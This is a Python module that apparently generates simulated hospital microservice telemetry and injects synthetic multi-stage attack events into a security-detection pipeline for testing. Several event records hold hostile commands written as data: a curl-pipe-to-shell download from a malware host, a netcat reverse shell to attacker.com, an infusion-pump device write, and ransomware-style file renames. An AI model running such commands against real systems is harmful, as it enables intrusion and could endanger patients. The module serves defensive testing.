"""
SentinelCloud Live Telemetry & Attack Generator
================================================
Generates continuous, realistic clinical microservice telemetry at variable rates,
and executes periodic cyber-attack scenarios at variable intervals.
"""

import time
import random
import threading
import logging
from typing import Optional

from backend.core.event_schema import TelemetryEvent, TelemetrySource, DataMode, ServiceStatus

logger = logging.getLogger("sentinel.live_generator")

# Clinical normal event templates
CLINICAL_EVENTS = [
    # EHR Service
    {
        "pod_name": "ehr",
        "syscall_name": "sys_read",
        "binary": "/usr/local/bin/gunicorn",
        "target": "/data/patient_records.json",
        "port": 0,
        "payload_size": 0,
        "params": {"query": "SELECT patient_history FROM records WHERE patient_id='PT-7821'", "actor": "dr_evans@hospital.local"},
    },
    {
        "pod_name": "ehr",
        "syscall_name": "sys_openat",
        "binary": "/usr/local/bin/gunicorn",
        "target": "/data/lab_results_2026.json",
        "port": 0,
        "payload_size": 0,
        "params": {"query": "GET /api/v1/lab_results/cbc", "actor": "nurse_patel@hospital.local"},
    },
    {
        "pod_name": "ehr",
        "syscall_name": "sys_read",
        "binary": "/usr/local/bin/gunicorn",
        "target": "/data/prescriptions.json",
        "port": 0,
        "payload_size": 0,
        "params": {"query": "VERIFY prescription_auth FOR rx_id='RX-99214'", "actor": "pharm_davis@hospital.local"},
    },

    # Vitals Monitor
    {
        "pod_name": "vitals",
        "syscall_name": "sys_recvfrom",
        "binary": "/app/vitals_collector",
        "target": "icu-bedside:9002",
        "port": 9002,
        "payload_size": 0,
        "params": {"channel": "ecg_lead_ii", "sample_rate": 250, "metric": "heart_rate_bpm:74"},
    },
    {
        "pod_name": "vitals",
        "syscall_name": "sys_recvfrom",
        "binary": "/app/vitals_collector",
        "target": "icu-bedside:9002",
        "port": 9002,
        "payload_size": 0,
        "params": {"channel": "pulse_oximeter", "sample_rate": 100, "metric": "spo2_pct:98.5"},
    },
    {
        "pod_name": "vitals",
        "syscall_name": "sys_write",
        "binary": "/app/vitals_collector",
        "target": "/data/vitals_timeseries.dat",
        "port": 0,
        "payload_size": 0,
        "params": {"batch_size": 64, "compression": "zstd"},
    },

    # Smart Drug Dispenser
    {
        "pod_name": "drug-dispenser",
        "syscall_name": "sys_write",
        "binary": "/usr/bin/dispenser_srv",
        "target": "/dev/ttyUSB0",
        "port": 0,
        "payload_size": 0,
        "params": {"pump_id": "PUMP-03", "infusion_rate_ml_hr": 2.5, "medication": "Regular Insulin"},
    },
    {
        "pod_name": "drug-dispenser",
        "syscall_name": "sys_read",
        "binary": "/usr/bin/dispenser_srv",
        "target": "/data/drug_formulary.json",
        "port": 0,
        "payload_size": 0,
        "params": {"check": "max_dose_limit", "drug_code": "INS-REG-100"},
    },

    # Billing Ledger
    {
        "pod_name": "billing",
        "syscall_name": "sys_connect",
        "binary": "/usr/bin/billing_api",
        "target": "payment-gw:443",
        "port": 443,
        "payload_size": 0,
        "params": {"action": "claims_audit", "claim_id": "CLM-48201", "icd10": "E11.9"},
    },
    {
        "pod_name": "billing",
        "syscall_name": "sys_read",
        "binary": "/usr/bin/billing_api",
        "target": "/data/icd10_codes.db",
        "port": 0,
        "payload_size": 0,
        "params": {"lookup": "E11.9", "description": "Type 2 diabetes without complications"},
    },
]


class LiveTrafficGenerator:
    """Generates continuous live clinical telemetry and executes periodic attacks."""

    def __init__(self, pipeline):
        self.pipeline = pipeline
        self.running = False
        self.thread: Optional[threading.Thread] = None

        # Attack interval configuration (variable 45 to 80 seconds)
        self.min_attack_interval = 45.0
        self.max_attack_interval = 80.0
        self.next_attack_interval = random.uniform(self.min_attack_interval, self.max_attack_interval)
        self.last_attack_time = time.time()

    def start(self):
        if self.running:
            return
        self.running = True
        self.last_attack_time = time.time()
        self.thread = threading.Thread(target=self._run_loop, daemon=True, name="LiveTrafficGenerator")
        self.thread.start()
        logger.info("Live clinical telemetry & attack generator started (Next attack in ~%.1fs)", self.next_attack_interval)

    def stop(self):
        self.running = False
        logger.info("Live telemetry generator stopped")

    def _run_loop(self):
        # Initial warm-up delay
        time.sleep(3.0)

        while self.running:
            try:
                now = time.time()

                # Check if it's time for an attack scenario
                time_since_attack = now - self.last_attack_time
                any_pod_under_attack = any(
                    s.status in (ServiceStatus.DEGRADED, ServiceStatus.QUARANTINED, ServiceStatus.REDEPLOYING)
                    for s in self.pipeline.services.values()
                )

                if time_since_attack >= self.next_attack_interval and not any_pod_under_attack:
                    self._execute_random_attack()
                    self.last_attack_time = time.time()
                    self.next_attack_interval = random.uniform(self.min_attack_interval, self.max_attack_interval)
                    logger.info("Next cyber-attack scheduled in ~%.1f seconds", self.next_attack_interval)
                else:
                    # Emit normal clinical telemetry event
                    self._emit_normal_event()

                # Variable rate: sleep between 1.2s and 2.8s
                sleep_time = random.uniform(1.2, 2.8)
                time.sleep(sleep_time)

            except Exception as e:
                logger.error("Error in live telemetry generator loop: %s", e)
                time.sleep(2.0)

    def _emit_normal_event(self):
        """Emit a realistic normal clinical event."""
        template = random.choice(CLINICAL_EVENTS)
        # Avoid emitting normal events to a pod currently undergoing quarantine/redeploy
        pod_status = self.pipeline.services.get(template["pod_name"])
        if pod_status and pod_status.status != ServiceStatus.HEALTHY:
            return

        event = TelemetryEvent(
            source=TelemetrySource.HTTP_INGESTION,
            data_mode=DataMode.LIVE,
            pod_name=template["pod_name"],
            namespace="medical",
            syscall_name=template["syscall_name"],
            binary=template["binary"],
            target=template["target"],
            port=template["port"],
            payload_size=template["payload_size"],
            params=template["params"],
        )
        self.pipeline.process_event(event)

    def _execute_random_attack(self):
        """Execute a multi-stage cyber attack scenario."""
        scenario_choice = random.choice(["ransomware_ehr", "lateral_billing", "firmware_dispenser"])
        logger.warning(">>> LAUNCHING PERIODIC CYBER-ATTACK SCENARIO: %s <<<", scenario_choice)

        if scenario_choice == "ransomware_ehr":
            self._attack_ransomware_ehr()
        elif scenario_choice == "lateral_billing":
            self._attack_lateral_billing()
        else:
            self._attack_firmware_dispenser()

    def _attack_ransomware_ehr(self):
        """Multi-stage ransomware kill-chain on EHR pod."""
        # Stage 1: Spawn unauthorized shell
        ev1 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="ehr",
            namespace="medical",
            syscall_name="sys_execve",
            binary="/bin/bash",
            target="",
            params={"argv": ["/bin/bash", "-c", "curl -s http://malware.darknet.ru/drop.sh | sh"]},
        )
        self.pipeline.process_event(ev1)
        time.sleep(1.2)

        # Stage 2: Encrypt database records (.locked)
        ev2 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="ehr",
            namespace="medical",
            syscall_name="sys_rename",
            binary="/bin/mv",
            target="/data/patient_records.db.locked",
            params={"old_path": "/data/patient_records.db", "new_path": "/data/patient_records.db.locked"},
        )
        self.pipeline.process_event(ev2)
        time.sleep(1.2)

        # Stage 3: Lateral SMB pivot
        ev3 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="ehr",
            namespace="medical",
            syscall_name="sys_connect",
            binary="/usr/bin/smbclient",
            target="billing:445",
            port=445,
            protocol="tcp",
            params={"share": "C$"},
        )
        self.pipeline.process_event(ev3)

    def _attack_lateral_billing(self):
        """Lateral movement and unauthorized access on Billing pod."""
        # Stage 1: Unauthorized command execution
        ev1 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="billing",
            namespace="medical",
            syscall_name="sys_execve",
            binary="/bin/bash",
            target="",
            params={"argv": ["/bin/bash", "-c", "nc -e /bin/sh attacker.com 4444"]},
        )
        self.pipeline.process_event(ev1)
        time.sleep(1.2)

        # Stage 2: Lateral port 445 SMB pivot to drug dispenser
        ev2 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="billing",
            namespace="medical",
            syscall_name="sys_connect",
            binary="/usr/bin/smbclient",
            target="drug-dispenser:445",
            port=445,
            protocol="tcp",
            params={"share": "ADMIN$"},
        )
        self.pipeline.process_event(ev2)

    def _attack_firmware_dispenser(self):
        """Memory tamper and unauthorized device access on Drug Dispenser."""
        # Stage 1: Unexpected shell
        ev1 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="drug-dispenser",
            namespace="medical",
            syscall_name="sys_execve",
            binary="/bin/bash",
            target="",
            params={"argv": ["/bin/bash", "-c", "echo 999 > /dev/ttyUSB0"]},
        )
        self.pipeline.process_event(ev1)
        time.sleep(1.2)

        # Stage 2: Device manipulation
        ev2 = TelemetryEvent(
            source=TelemetrySource.LAB_TEST,
            pod_name="drug-dispenser",
            namespace="medical",
            syscall_name="sys_rename",
            binary="/bin/mv",
            target="/data/infusion_calibration.conf.locked",
            params={"old_path": "/data/infusion_calibration.conf", "new_path": "/data/infusion_calibration.conf.locked"},
        )
        self.pipeline.process_event(ev2)
